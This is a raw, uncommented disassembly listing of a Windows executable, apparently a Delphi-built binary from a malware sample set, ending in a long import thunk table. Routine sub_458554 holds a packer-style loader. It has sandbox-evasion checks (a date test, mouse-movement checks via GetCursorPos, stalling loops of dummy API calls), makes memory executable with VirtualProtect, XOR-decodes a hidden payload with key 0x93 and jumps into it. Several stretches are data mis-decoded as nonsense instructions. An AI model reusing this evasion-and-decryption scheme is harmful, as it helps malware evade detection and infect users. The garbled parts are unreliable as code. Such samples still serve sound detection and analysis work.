call [ ebx + 0xa0 ]
jmp r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
jmp r-xdata
sub_45828c
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038a0#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4582b8
retn
sub_4582c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ ebp + eax * 2 + 0x45840400 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
test [ ebp ] al
sbb al 0x3
add [ eax ] al
test al 0xa4
inc esp
add [ eax ] ch
int3
sub_4583b2
inc esp
add [ eax ] ah
mov es [ ebx ]
and al 0x8e
inc ebx
add [ esi + esi * 8 - 0x737bffbc ] ah
inc ebx
add ah bh
mov eax 0xfd980043
inc esp
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ edx + edx - 0x37cfffbb ] ch
inc esp
add al ah
0x44
sub_4583e0
mov [ ebx ] es
inc ebp
add al cl
rol [ eax + eax + 0x44 ] cl
aam 0x44
add [ esi + edx - 0x2effffbb ] cl
inc esp
add [ eax + 0x70004511 ] dl
clc
inc esp
add [ ebx + edx + 0x45 ] al
add [ eax ] ch
fiadd [ eax + eax + 0x9 ]
add [ ebp - 0x7ffba7c ] bl
add al [ eax ]
add [ eax ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
or eax [ ebp + 0x78 ]
arpl [ ebp + 0x6c ] sp
jo r-xdata
add ch [ esi ]
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ 0x74696e55 ] al
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor [ edi ] eax
add al dl
cmp eax 0xc48c0044
jne r-xdata
outsb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
and bh bh
add eax rw-data
xor [ eax ] edx
add [ ebp ] 0xfffffff0
movsd [ edi ] [ esi ]
inc esp
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
push ecx
mov [ ebp - 0x4 ] edx
je r-xdata
xor dl [ eax ]
add eax [ eax ]
add [ 0x72470900 ] al
outsd
jne r-xdata
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] ecx
add [ eax ] al
add al 0x0
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
cld
add al [ eax ]
add [ ecx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ edi ] al
inc edx
jne r-xdata
cmp [ ebp - 0x4 ] 0x9
jbe r-xdata
nop
add [ eax ] al
mov eax eax
cmp eax 0x18af
jbe r-xdata
inc edx
outsd
js r-xdata
add [ eax - 0x33 ] dh
inc edx
je r-xdata
cmp ecx 0x1727
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
nop
nop
jmp edx
add [ ebx + eax * 4 + 0x42 ] cl
add al ah
lea eax [ edx ]
sar [ ebx + 0x7bec0042 ] 0x1
inc ebp
add [ eax + r-xdata ] dl
pop es
push es
push esp
inc esi
outsd
jb r-xdata
int 0x42
adc al 0x3
add [ eax ] al
add eax [ eax ]
push es
push eax
popad
outsb
insb
xor bl [ eax ]
add eax [ eax ]
add [ esi ] al
add [ ebx ] cl
inc ebp
js r-xdata
inc edx
mov esp es
outsb
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
push es
push eax
popad
outsb
insb
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
or edx [ edx + 0x61 ]
inc ebx
push 0x31747261
push es
push esp
inc esi
outsd
jb r-xdata
insb
sub_4584dc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] edx
cmp eax 0x18af
jbe r-xdata
cmp [ ebp - 0x4 ] 0x9
jbe r-xdata
nop
cmp ecx 0x1727
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
nop
nop
jmp edx
sub_458554
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi rw-data
mov edi rw-data
xor eax eax
push ebp
push j_sub_4038a0#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458781
retn
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call PatBlt
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x6
je r-xdata
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
call RemoveFontMemResourceEx
jmp r-xdata
nop
nop
mov ebx 0x2480
nop
jmp r-xdata
push 0x0
call RemoveFontMemResourceEx
nop
nop
push 0x0
call RemoveFontMemResourceEx
nop
nop
dec ebx
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
push 0x0
call RemoveFontMemResourceEx
push 0x0
call RemoveFontMemResourceEx
mov ebx 0x8882
nop
nop
jmp r-xdata
push 0x0
call RemoveFontMemResourceEx
dec ebx
jne r-xdata
nop
push 0x0
call RemoveFontMemResourceEx
nop
nop
mov eax 0x22ad733d
call sub_402734
mov ecx eax
nop
nop
test ecx ecx
je r-xdata
mov ebx 0x1
mov eax ecx
add eax [ esi ]
mov [ eax ] dl
inc ebx
cmp ebx 0x22ad6147
jne r-xdata
call sub_4030a4
nop
nop
mov [ esi ] ebx
nop
mov eax [ esi ]
inc eax
push ecx
mov ecx 0x5
xor edx edx
div ecx
pop ecx
cmp edx 0xff
jbe r-xdata
nop
mov eax ecx
call sub_402754
mov ebx 0x8840
push 0x0
call RemoveFontMemResourceEx
dec ebx
jne r-xdata
nop
nop
xor ebx ebx
nop
nop
push rw-data
call GetCursorPos
nop
push 0x0
call RemoveFontMemResourceEx
nop
push 0x0
push 0x10
call SleepEx
nop
nop
cmp ebx 0x3
jbe r-xdata
nop
inc ebx
nop
mov eax [ edi ]
mov [ rw-data ] eax
nop
nop
nop
nop
push edi
call GetCursorPos
nop
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0xb
jbe r-xdata
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_4050ec
cmp [ rw-data ] 0x0
jne r-xdata
push esi
push 0x40
push 0x5e29
mov eax [ rw-data ]
push eax
call VirtualProtect
nop
xor ebx ebx
nop
jmp r-xdata
nop
mov [ esi ] ebx
nop
mov eax [ rw-data ]
add eax [ esi ]
mov al [ eax ]
nop
nop
xor al 0x93
mov edx [ rw-data ]
add edx [ esi ]
mov [ edx ] al
inc ebx
cmp ebx 0x5e2a
jne r-xdata
nop
mov ebx 0x3d41
nop
mov eax [ rw-data ]
add eax ebx
mov [ esi ] eax
nop
nop
mov ecx 0x3009
mov edx [ esi ]
mov eax 0x1d2a
call sub_4584dc
nop
jmp r-xdata
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_405ed8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4546ec
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_454704
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454784
call sub_403dac
sub_4011ba
call [ eax + 0x244483cc ]
add al 0xf8
jmp sub_405808
sub_4011c7
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405830
sub_4011d1
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405844
sub_401294
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_4012a4
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_4012bc
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_4012d4
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_4012e4
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_401304
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_401324
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_401344
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
sub_40135c
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_401374
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_401384
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_4013a8
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_4013c8
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_4013d0
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_4013d8
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_4013e0
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401b2a
jmp sub_4038a0
sub_401b31
mov al [ rw-data ]
pop ebp
retn
sub_401c0e
jmp sub_4038a0
sub_401cdc
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022f0
retn
sub_4022dc
jmp sub_4038a0
sub_402482
jmp sub_4038a0
sub_402721
jmp sub_4038a0
sub_4027e4
call sub_405e8c
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405e8c
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_402838
mov [ rw-data ] edx
call sub_403e84
sub_40289c
push eax
push edx
push ecx
call sub_405e8c
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402890
retn
sub_4028b8
retn
sub_40290c
retn
sub_402910
push ebx
call sub_405e8c
mov ebx [ eax + 0x4 ]
call sub_405e8c
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_40297c
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_40298c
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402a04
mov edx [ eax + 0x1c ]
call sub_4029bc
retn
sub_402c6c
mov ecx 0xff
call sub_402c78
retn
sub_402c9c
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402cb8
jmp sub_402cb8
sub_402cb5
retn
sub_403045
jmp sub_4038a0
sub_403098
fninit
fwait
fldcw [ rw-data ]
retn
sub_4030f0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4030fc
push ebx
mov ebx eax
mov eax ebx
call sub_40312c
call sub_402734
mov edx eax
mov eax ebx
call sub_403170
pop ebx
retn
sub_403118
push ebx
mov ebx eax
mov eax ebx
call sub_4031c8
mov eax ebx
call sub_402754
pop ebx
retn
sub_40312c
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403154
call sub_4034d8
test dl dl
jle r-xdata
retn
call sub_4034c0
sub_403214
retn
sub_40329c
jmp sub_4038a0
sub_4032a3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403394
mov eax 0x8000ffff
retn
sub_40339c
retn
sub_4033a0
retn
sub_4033a4
retn
sub_403499
jmp sub_4035ec
sub_40349e
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403900
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4034c0
sub_4034c0
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4034c8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4034d8
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4034e8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4035b0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4035cc
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403999
retn
sub_403adc
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403b6a
jmp sub_4035ec
sub_403bca
jmp sub_4035ec
sub_403be4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403adc
mov [ rw-data ] 0x0
call sub_403b84
retn
sub_403d1d
retn
sub_403e7f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403e84
mov [ rw-data ] eax
call sub_403dac
sub_4040c0
retn
sub_4040fc
retn
sub_40410a
retn
sub_404123
retn
sub_404134
retn
sub_40421b
retn
sub_40434c
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404368#2
jmp sub_404368
sub_4043b1
retn
j_sub_404368
jmp sub_404368
sub_4043b9
retn
sub_4043fb
retn
sub_404554
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402890
sub_40456c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_40135c
sub_4046c4
retn
sub_4046d6
retn
sub_4046d8
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404900
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402890
call [ rw-data ]
retn
sub_404a04
mov ecx 0x1
jmp sub_404918
sub_404a0e
retn
sub_404a10
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402890
call [ rw-data ]
retn
sub_404c36
retn
sub_404c38
xchg ecx eax
xchg edx ecx
call sub_403ff8
retn
sub_404c8c
mov al 0x11
jmp sub_402890
sub_404cb7
retn
sub_404ef8
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404b44
pop ebp
retn 0x4
j_sub_404918
jmp sub_404918
sub_404f0d
retn
sub_404f10
call sub_4050b0
retn
sub_40513c
call sub_405114
retn
sub_405485
jmp sub_4038a0
sub_4055f0
call sub_405600
retn
sub_4055f8
call sub_405620
retn
sub_405600
push ebx
mov ebx eax
mov eax 0x8
call sub_402734
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4056bb
jmp sub_4035ec
sub_4056dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405750
jmp sub_4038a0
sub_405757
pop ecx
pop ebp
retn
sub_4057d0
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4057dc
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_4057e8
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402890
sub_4057f8
call sub_4030fc
mov [ eax + 0x4 ] 0x1
retn
sub_405830
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405b1f
jmp sub_4038a0
sub_405b26
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405bc3
jmp sub_4038a0
sub_405bca
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c13
jmp sub_4038a0
sub_405c1a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405cde
jmp sub_4038a0
sub_405ce5
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405d36
jmp sub_4038a0
sub_405d3d
pop ebp
retn
sub_405e14
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405e34
push eax
push 0x40
call LocalAlloc
retn
sub_405e40
mov eax 0x10
retn
sub_405ecc
mov eax rw-data
call sub_4056dc
retn
sub_405f41
jmp sub_4038a0
sub_405f48
pop ebp
retn
sub_405f4c
sub [ rw-data ] 0x1
retn
sub_405f54
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405f70
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405fb9
jmp sub_4038a0
sub_405fc0
pop ebp
retn
sub_405fc4
sub [ rw-data ] 0x1
retn
sub_405fcc
rcr [ edi + 0x40 ] 0x1
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
int3
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_406280
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ SleepEx@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetTextMetricsA
jmp [ GetTextMetricsA@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ MoveToEx@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
